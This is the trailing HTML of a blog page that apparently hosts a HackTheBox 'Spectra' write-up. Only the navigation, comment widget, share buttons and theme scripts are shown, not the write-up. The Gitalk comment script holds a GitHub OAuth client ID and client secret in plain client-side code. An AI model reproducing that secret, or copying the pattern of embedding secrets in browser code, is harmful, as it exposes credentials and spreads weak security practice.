        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Love - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&title=《Spectra - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&title=《Spectra - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Spectra - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrklEQVR42u3aQW7DQAgF0Nz/0q3UVaXWzgeGpJWeV5HjODwvhjHweMTHx9dRPf/9259XJmfyb0cHHh4eXiv0q+Mq3CTE5Ff3/3X1gJKY8fDw8LZ59wtxEkQv6Dyp3KeZy/N4eHh4b+XdL/f58t3bIuPh4eH9X16ypZ7cEw8PD++/8KqLeLXkmhR8kwLEYq0FDw8PL+ZNFuV3fV7s7+Hh4eENuurVJJEXLyZts0K0eHh4eAu8vFV//zd5WNWVPE8JhTcGPDw8vDGvupGtDkXNH1AvQjw8PLwN3nw4NdlYz++TJ5gnbwx4eHh4Y15eGug1tyYV12gsIGm/4eHh4R3lVUdL8yJv7/pq2bdcgMDDw8M7yqsOQlWLs/kowGTDfZkY8PDw8BZ4vfZ/3qbKH8d8M42Hh4e3zZtsl3upIi9tVMeznoxb4eHh4Y15+dY2WfRPpZP7R1yNHA8PD2+D1ws3ByeMPCVUyx94eHh4e7xkOU623T1MtW9VjQcPDw/vLK9afp2f6SWVagrBw8PD2+Dly3pSaOiVM3rLfVR6xsPDw3sJLwH0Sqvz8YIqFQ8PD2+PlxQjJgXW+eNrjnbh4eHhLfB6hYMeu4o5NdSFh4eHt8c7O4Mw2Zr3ShhPhgbw8PDwjvKqr/150Pk1k2JEOXng4eHhDXjRNNb4EZxa7stJCA8PD+8lvF654TE48lJyOcvh4eHhLfAmLfzqb/NtdDVcPDw8vFfyPopHL6A8tUyGrgpvDHh4eHhnqq/ljW9y62S73BtNGFWp8fDw8Ma8STI41cSqLvqFQjAeHh7eGq+aDOZjVb17lmsteHh4eG/l9RbuXuO/1wb75Uo8PDy8P8BLNrJz9ql2Gh4eHt4e71QxYrKZztPP/cqPh4eHt83rDTadal9VRxNGfTw8PDy8Ke8TiJjFOm/ehPcAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
